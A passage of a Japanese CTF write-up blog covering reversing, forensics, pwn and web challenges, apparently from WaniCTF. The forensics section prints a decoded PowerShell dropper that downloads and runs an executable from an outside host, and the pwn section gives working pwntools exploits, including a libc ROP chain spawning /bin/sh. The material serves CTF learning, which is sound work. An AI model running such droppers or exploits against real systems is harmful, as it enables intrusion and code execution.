+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">FUN_00101080</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pcVar2;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pcVar3;
+</span></span><span style="display:flex;"><span>  undefined1 <span style="color:#f92672">*</span>puVar4;
+</span></span><span style="display:flex;"><span>  undefined1 <span style="color:#f92672">*</span>puVar5;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  puVar4 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>DAT_0010404c;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>    puVar5 <span style="color:#f92672">=</span> puVar4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>;
+</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getc</span>(stdin);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>puVar4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    puVar4[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)iVar1;
+</span></span><span style="display:flex;"><span>    puVar4 <span style="color:#f92672">=</span> puVar5;
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (puVar5 <span style="color:#f92672">!=</span> <span style="color:#f92672">&amp;</span>DAT_0010424c);
+</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x100</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00101220</span>();
+</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> iVar1 <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (iVar1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  pcVar2 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>DAT_00104e4d;
+</span></span><span style="display:flex;"><span>  pcVar3 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>DAT_00104020;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>pcVar2 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>pcVar3) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Wrong!&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    pcVar2 <span style="color:#f92672">=</span> pcVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>;
+</span></span><span style="display:flex;"><span>    pcVar3 <span style="color:#f92672">=</span> pcVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (pcVar2 <span style="color:#f92672">!=</span> <span style="color:#f92672">&amp;</span>DAT_0010504d);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Correct!&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>標準入力からの文字列を 32 文字分 ((DAT_0010424c - DAT_0010404c) / 0x10 = 0x20) 保存する．
+そのあと，do~while を 100 回繰り返すが，その中に FUN_00101220 を含む．
+最後に，&amp;DAT_00104e4d の値と &amp;DAT_00104020; の値を比較して合致していれば correct となる．</p>
+<p>というわけで angr で解いてみると以下のようになる．</p>
+<p>今回は以下のように環境を構築する</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pipenv install
+</span></span><span style="display:flex;"><span>pipenv shell
+</span></span><span style="display:flex;"><span>pip install angr
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> angr
+</span></span><span style="display:flex;"><span>proj <span style="color:#f92672">=</span> angr<span style="color:#f92672">.</span>Project(<span style="color:#e6db74">&#34;./gates&#34;</span>, auto_load_libs<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@project.hook</span>(<span style="color:#ae81ff">0x401124</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_flag</span>(state):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;FLAG&#34;</span>, state<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>))
+</span></span><span style="display:flex;"><span>    project<span style="color:#f92672">.</span>terminate_execution()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>project<span style="color:#f92672">.</span>execute()
+</span></span></code></pre></div><h2 id="forensics">forensics</h2>
+<h3 id="tiny_usb">tiny_usb</h3>
+<p>.iso が渡されます．
+中身を見ると png が入ってるので見ると flag が取れます</p>
+<h3 id="surveillance_of_sus">Surveillance_of_sus</h3>
+<p>.bin のキャッシュファイルが渡されます．
+<a href="https://github.com/ANSSI-FR/bmc-tools">bmc-tools</a> なるものを使って復元すると windows 画面っぽいものがたくさん手に入ります．
+この画像をくっつけると flag が取れます</p>
+<h3 id="codebreaker">codebreaker</h3>
+<p>でっかいバツがかかれた QR コードが渡されます．
+そのままでは当然読み取れないので手で復元します．
+最初は隅っこと右下のキーを描きなおします．
+そのあとは，ナナメの線は消える，みたいな感じで消していくといつか読み取れるようになります．</p>
+<p>GIMP を使いましたが，コントラストをぐっと上げると判別しやすくなります．</p>
+<h3 id="i_wanna_be_a_streamer">I_wanna_be_a_streamer</h3>
+<p>wireshark でストリームをキャッチしたファイルが渡されます．
+そのままだと h264 をデコードできないので，<a href="https://github.com/volvet/h264extractor">プラグイン</a>を入れます．
+<a href="https://stackoverflow.com/questions/26164442/decoding-rtp-payload-as-h264-using-wireshark">ここらへん</a>を参考にしてインストールしました．
+デコードすると動画が手に入ります．
+動画の中に flag が書いてあります．</p>
+<h3 id="tiny_10px">tiny_10px</h3>
+<p>10 px * 10 px の jpg が渡されます．
+jpg のフォーマットを見ると<a href="https://qiita.com/spc_ehara/items/87d383a59a37a2c82531#sofstart-of-frame----%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%E3%83%98%E3%83%83%E3%83%80">SOFヘッダなるものが見つかりますが，</a>ここで画像サイズが参照されます．
+ここを hexeditor なりで変更してあげれば画像が復元できます．</p>
+<h3 id="mem_search">mem_search</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 volatility3/vol.py -f chal_mem_search.DUMP windows.filescan | grep Mikka
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0xcd88cebc26c0  <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\M</span>ikka<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\r</span>ead_this_as_admin.lnknload        <span style="color:#ae81ff">216</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>明らかに怪しいので，これに関連したものを見る</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>└─$ python3 volatility3/vol.py -f chal_mem_search.DUMP windows.filescan | grep admin
+</span></span><span style="display:flex;"><span>0xcd88cdd78a30.0<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>rchadmin.dll <span style="color:#ae81ff">216</span>
+</span></span><span style="display:flex;"><span>0xcd88cebae1c0  <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\M</span>ikka<span style="color:#ae81ff">\D</span>ownloads<span style="color:#ae81ff">\r</span>ead_this_as_admin.download      <span style="color:#ae81ff">216</span>
+</span></span><span style="display:flex;"><span>0xcd88cebc26c0  <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\M</span>ikka<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\r</span>ead_this_as_admin.lnknload        <span style="color:#ae81ff">216</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/wani<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat file.0xcd88cebc26c0.0xcd88ced4e5f0.DataSectionObject.read_this_as_admin.lnknload 
+</span></span><span style="display:flex;"><span>-- sniff--
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-window hidden -noni -enc JAB1AD0AJwBoAHQAJwArACcAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQA2ADoAOAAyADgAMgAvAEIANgA0AF8AZABlAGMAJwArACcAbwBkAGUAXwBSAGsAeABCAFIAMwB0AEUAWQBYAGwAMQBiAFYAOQAwAGEARwBsAHoAWAAnACsAJwAyAGwAegBYADMATgBsAFkAMwBKAGwAZABGADkAbQBhAFcAeABsAGYAUQAlADMAJwArACcARAAlADMARAAvAGMAaABhAGwAbABfAG0AZQBtAF8AcwBlACcAKwAnAGEAcgBjAGgALgBlACcAKwAnAHgAZQAnADsAJAB0AD0AJwBXAGEAbgAnACsAJwBpAFQAZQBtACcAKwAnAHAAJwA7AG0AawBkAGkAcgAgAC0AZgBvAHIAYwBlACAAJABlAG4AdgA6AFQATQBQAFwALgAuAFwAJAB0ADsAdAByAHkAewBpAHcAcgAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZABcAG0AcwBlAGQAZwBlAC4AZQB4AGUAOwAmACAAJABkAFwAbQBzAGUAZABnAGUALgBlAHgAZQA7AH0AYwBhAHQAYwBoAHsAfQA<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-- sniff --
+</span></span></code></pre></div><p>これを cyberchef で base64 + decode text(UTF16) デコードすると以下のようになります</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$u<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ht&#39;</span>+<span style="color:#e6db74">&#39;tp://192.168.0.16:8282/B64_dec&#39;</span>+<span style="color:#e6db74">&#39;ode_RkxBR3tEYXl1bV90aGlzX&#39;</span>+<span style="color:#e6db74">&#39;2lzX3NlY3JldF9maWxlfQ%3&#39;</span>+<span style="color:#e6db74">&#39;D%3D/chall_mem_se&#39;</span>+<span style="color:#e6db74">&#39;arch.e&#39;</span>+<span style="color:#e6db74">&#39;xe&#39;</span>;$t<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Wan&#39;</span>+<span style="color:#e6db74">&#39;iTem&#39;</span>+<span style="color:#e6db74">&#39;p&#39;</span>;mkdir -force $env:TMP<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\$</span>t;try<span style="color:#f92672">{</span>iwr $u -OutFile $d<span style="color:#ae81ff">\m</span>sedge.exe;&amp; $d<span style="color:#ae81ff">\m</span>sedge.exe;<span style="color:#f92672">}</span>catch<span style="color:#f92672">{}</span>
+</span></span></code></pre></div><p>これをさらに base64 でデコードすると flag が出てきます</p>
+<h2 id="pwn">pwn</h2>
+<h3 id="nc">nc</h3>
+<p>接続すればいいです</p>
+<h3 id="do_not_rewite">do_not_rewite</h3>
+<p>配列は 3 要素しかないのに，ループは 4 周するので配列外アクセスが可能になる．
+これを使って ROP しようと思いつくが，canary があるのでそのままだと stack smash detected となる．</p>
+<p>ghidra で for ループは *main + 0x1AA の場所にあることがわかるので，gdb で止めてみる．
+canary と rbp が見えるが，4 つめまでのループを回すと確かに canary が侵食されていることが分かる．
+しかし，canary は amount of grams にしか対応していないので，ここを書き換えなければいい．</p>
+<p>修飾子である <code>%lf</code> は <code>+</code> を入力すれば値を書き換えずに scanf が終了する．</p>
+<p>最後に，win 関数は system() を使っているが，system() はスタックが 16 bytes アラインメントされていなければならないことに注意する．</p>
+<p>なので，以下のような solver でよい</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./chall&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hint: show_flag = 0x&#34;</span>)
+</span></span><span style="display:flex;"><span>win <span style="color:#f92672">=</span> int(s<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;win addr is: &#34;</span> <span style="color:#f92672">+</span> hex(win))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;anpan&#39;</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;123&#39;</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;000&#39;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;normal OK&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>sendline(pack(win <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>))
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;+&#39;</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;+&#39;</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="do_not_rewite2">do_not_rewite2</h3>
+<p>配列外のアクセスは変わっていないが，今回は win 関数の代わりに printf() が渡されている．</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./chall&#34;</span>
+</span></span><span style="display:flex;"><span>so <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./libc.so.6&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(path)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(so)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hint: printf = &#34;</span>)
+</span></span><span style="display:flex;"><span>add_printf <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline(), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>add_printf <span style="color:#e6db74">= :</span><span style="color:#e6db74">08x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;anpan&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1234&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1234&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> add_printf <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>printf
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>libc<span style="color:#f92672">.</span>address <span style="color:#e6db74">= :</span><span style="color:#e6db74">08x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(libc)
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)))
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>SYS_execve
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;syscall&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>, rop<span style="color:#f92672">.</span>chain())
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="web">Web</h2>
+<h3 id="bad_worker">Bad_Worker</h3>
+<p>開発者ツールでネットワークを見ると FLAG.txt をダウンロードしているっぽいので直接 FLAG.txt を持ってきます</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl https://<span style="color:#f92672">[</span>xxx<span style="color:#f92672">]</span>.wanictf.org/FLAG.txt
+</span></span></code></pre></div><h3 id="pow">pow</h3>
+<p>ごく簡単に言うとすごく重い計算( 10 回 sha256 を計算して先頭 48 bytes が全て 0 になる数字を 1000000 個見つける)が完了するまで終わらないページが開いている．
+[&ldquo;2862152&rdquo;] で一個目が見つかるので相当大変</p>
+<p>でも [&ldquo;2862152&rdquo;] を複数回送ってもカウントは増える．
+そこで，[&ldquo;2862152&rdquo;] を 1000000 回送るようにすればいい.</p>
+
+    </div>
+    <div class="post-footer">
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css" integrity="sha384-dbVIfZGuN1Yq7/1Ocstc1lUEm+AT+/rCkibIcC/OmWo5f0EA48Vf8CytHzGrSwbQ" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js" integrity="sha384-2BKqo+exmr9su6dir+qCw08N2ZKRucY4PrGQPPWU1A7FtlCGjmEGFqXCv5nyM5Ij" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false}]
+    });
+  });
+</script>
+      
+    </div>
+  </article>
+  <hr>
+  <p>© side-realms All rights reserved.</p>
+
+    </main>
+  </body>
+</html>
